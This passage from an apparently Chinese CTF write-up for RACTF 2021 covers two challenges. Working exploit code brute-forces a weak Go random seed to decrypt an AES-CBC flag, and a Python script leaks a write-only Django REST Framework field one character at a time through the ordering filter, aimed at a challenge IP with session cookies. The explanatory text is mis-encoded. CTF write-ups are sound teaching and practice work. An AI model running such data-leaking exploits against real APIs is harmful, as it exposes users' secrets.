&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Int63&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">iv&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">BlockSize&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">iv&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">iv&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">flagmu&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Lock&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rawFlag&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">iv&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">BlockSize&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">flagmu&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Unlock&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">handler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ResponseWriter&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">req&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Request&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">flagmu&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Lock&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fprint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">w&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">flagmu&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Unlock&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Println&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Challenge starting up&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">HandleFunc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">handler&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">go&lt;/span> &lt;span style="color:#75af00">changer&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Fatal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">ListenAndServe&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;:80&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯ä»¥çœ‹åˆ°flagè¢«AES CBCåŠ å¯†ï¼ŒåŠ å¯†æœ¬èº«æ²¡é—®é¢˜ï¼Œé—®é¢˜å‡ºåœ¨ç§å­ä¸Šï¼›ç§å­ç”Ÿæˆæ˜¯é &lt;code>rand.Seed(time.Now().UnixNano() &amp;amp; ^0x7FFFFFFFFEFFF000)&lt;/code>å®Œæˆï¼Œè¿™æ ·å¾—åˆ°çš„ç§å­å¾ˆå° å¯ä»¥è¢«æˆ‘ä»¬çˆ†ç ´å‡ºæ¥&lt;/p>
&lt;p>exp.go&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-go" data-lang="go">&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#75af00">main&lt;/span>
&lt;span style="color:#f92672">import&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;math/rand&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;crypto/aes&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;crypto/cipher&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;encoding/hex&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;strings&amp;#34;&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">hextext&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#d88200">&amp;#34;35e57017892d2c615ed057d20eeee56f82c7b02d2d1b7efed6944c3cc660c914&amp;#34;&lt;/span> &lt;span style="color:#75715e">// Encrypted Flag
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">seed&lt;/span>&lt;span style="color:#f92672">:=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">seed&lt;/span>&lt;span style="color:#f92672">&amp;lt;=&lt;/span>&lt;span style="color:#ae81ff">19777868&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">seed&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">int64&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">seed&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Int63&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">iv&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">BlockSize&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">iv&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">iv&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">block&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewCipher&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">mode&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">cipher&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewCBCDecrypter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">block&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">iv&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">hex&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">DecodeString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">hextext&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">flagBytes&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">make&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75af00">mode&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">CryptBlocks&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flagBytes&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flagBytes&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Contains&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;ractf&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Flag: %s\n&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>ractf{int3rEst1ng_M4sk_paTt3rn}&lt;/code>&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://ctf.rip/write-ups/crypto/ractf-2021-military-grade/">wp&lt;/a>&lt;/p>
&lt;h2 id="websecret-store">Web/Secret Store&lt;/h2>
&lt;blockquote>
&lt;p>How many secrets could a secret store store if a store could store secrets?&lt;/p>
&lt;/blockquote>
&lt;p>æ³¨å†Œå’Œç™»å½•ä¹‹åŽå¯ä»¥é€šè¿‡apiè®¾ç½®ä¸€ä¸ªè‡ªå·±çš„secretï¼Œè®¾ç½®å¥½ä¹‹åŽè¿˜å¯ä»¥æ›´æ”¹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818040636796.png" alt="image-20210818040636796">&lt;/p>
&lt;p>ç»™å‡ºäº†æºç ï¼Œæ˜¯djangoæ¡†æž¶ï¼Œç”¨åˆ°äº†rest_frameworkï¼Œé¡µé¢çš„debugæ¨¡å¼è¿˜å¼€ç€ï¼Œæœ‰ä¸€ä¸ªåä¸ºsecretçš„app&lt;/p>
&lt;p>models.pyè§„å®šäº†æ•°æ®åº“çš„å­˜å‚¨&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818133525714.png" alt="image-20210818133525714">&lt;/p>
&lt;p>è¿˜æœ‰ä¸ªé…å¥—çš„model serializerï¼Œè§„å®šäº†åªè¯»å’Œåªå†™çš„ä¸åŒå†…å®¹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818133658766.png" alt="image-20210818133658766">&lt;/p>
&lt;p>ç„¶åŽæ˜¯views.pyï¼Œå½“ç¡®è®¤userç™»å½•çŠ¶æ€ä¹‹åŽï¼Œå¦‚æžœè®¾ç½®è¿‡secretå°†ä¼šå±•ç¤ºå‡ºæ¥&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818134115205.png" alt="image-20210818134115205">&lt;/p>
&lt;p>ç›´æŽ¥ç”¨Getæ–¹å¼è¯·æ±‚&lt;code>/api/secret/?format=json&lt;/code>å¯ä»¥å¾—åˆ°æ‰€æœ‰è®¾ç½®è¿‡çš„secretï¼Œç†æ‰€å½“ç„¶çš„çŒœæµ‹id=1,owner=1çš„value=flagï¼Œä½†æ˜¯valueå­—æ®µæ˜¯åªå†™è€Œéžåªè¯»çš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818151539994.png" alt="image-20210818151539994">&lt;/p>
&lt;p>ç”±äºŽç”¨çš„æ˜¯djangoçš„rest frameworkï¼Œå¯ä»¥åˆ©ç”¨å®ƒçš„&lt;a href="https://www.django-rest-framework.org/api-guide/filtering/#orderingfilter">Ordering Filter&lt;/a>åŠŸèƒ½æ¥å¯¹è¿™äº›jsonå†…å®¹æ ¹æ®valueæ¥è¿›è¡Œä¸€ä¸ªæŽ’åº&lt;code>/api/secret/?ordering=value&amp;amp;format=json&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818152408227.png" alt="image-20210818152408227">&lt;/p>
&lt;p>é‡‡ç”¨char-by-charçš„ç›²æ³¨æ–¹å¼ï¼Œä¸æ–­åœ°é‡å¤è®¾ç½®secret-&amp;gt;ä»¥valueæŽ’åº-&amp;gt;å¦‚æžœä½äºŽid=1,owner=1çš„å‰é¢ï¼Œå¹¶ä¸”ä¸‹ä¸€æ¬¡å°±ä½äºŽå®ƒçš„åŽé¢ï¼Œè¯´æ˜Žè¿™æ˜¯æ­£ç¡®çš„å­—ç¬¦-&amp;gt;ä¿®æ”¹secretï¼Œç»§ç»­çˆ†ç ´ä¸‹ä¸€ä¸ªå­—ç¬¦&lt;/p>
&lt;p>exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">json&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;ractf&amp;#34;&lt;/span>
&lt;span style="color:#111">csrf_token&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;XI7ZT6jdFeTvlywSDvRQT2xFlIAF2BRIF7ndzDOZqWPwZsIRdkbmgFSIpV8m9NIu&amp;#34;&lt;/span>
&lt;span style="color:#111">session_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;hkdm1dclym6oycoe8pcmyvlh5d87qfvq&amp;#34;&lt;/span>
&lt;span style="color:#111">headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;Cookie&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;csrftoken=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">csrf_token&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">; sessionid=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">session_id&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;X-CSRFToken&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">csrf_token&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">our_secret_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">14&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">update_secret&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">curr_flag&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">found_real_char&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">127&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">curr_flag&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">json_payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://193.57.159.27:21627/api/secret/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">json_payload&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># print(r.status_code)&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;http://193.57.159.27:21627/api/secret/?ordering=value&amp;amp;format=json&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">secrets&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">secret&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">secrets&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">found_real_char&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">our_secret_id&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">found_real_char&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
